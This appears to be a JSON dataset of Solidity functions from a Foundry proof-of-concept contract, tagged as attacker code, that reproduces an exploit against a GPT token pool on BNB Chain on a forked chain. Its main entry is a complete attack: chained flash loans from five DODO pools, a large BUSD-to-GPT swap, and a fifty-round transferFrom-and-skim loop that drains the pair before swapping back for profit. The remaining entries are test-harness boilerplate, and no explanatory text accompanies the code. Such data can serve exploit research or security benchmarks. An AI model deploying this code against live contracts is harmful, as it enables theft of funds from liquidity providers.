[
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == address(oracle1)) {\n            doFlashLoan(oracle2);\n        } else if (msg.sender == address(oracle2)) {\n            doFlashLoan(oracle3);\n        } else if (msg.sender == address(oracle3)) {\n            doFlashLoan(oracle4);\n        } else if (msg.sender == address(oracle4)) {\n            doFlashLoan(oracle5);\n        } else {\n            // Start attack\n            pair.sync();\n            BUSD.approve(address(router), type(uint256).max);\n            address[] memory path = new address[](2);\n            path[0] = address(BUSD);\n            path[1] = address(GPT);\n            router.swapExactTokensForTokens(100_000 ether, 0, path, address(this), block.timestamp + 100);\n\n            GPT.approve(address(this), type(uint256).max);\n            for (uint256 i = 0; i < 50; ++i) {\n                GPT.transferFrom(address(this), address(pair), 0.5 ether);\n                pair.skim(address(this));\n            }\n\n            path[0] = address(GPT);\n            path[1] = address(BUSD);\n            uint256 outAmount = router.getAmountsOut(GPT.balanceOf(address(this)), path)[1];\n            GPT.transfer(address(pair), GPT.balanceOf(address(this)));\n            pair.swap(outAmount, 0, address(this), bytes(\"\"));\n        }\n\n        BUSD.transfer(msg.sender, quoteAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_494_868);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CSExp",
    "source_type": "attacker_contract",
    "function_name": "testExp",
    "original_code": "    function testExp() external {\n        emit log_named_decimal_uint(\"[Start] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n\n        doFlashLoan(oracle1);\n\n        emit log_named_decimal_uint(\"[End] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]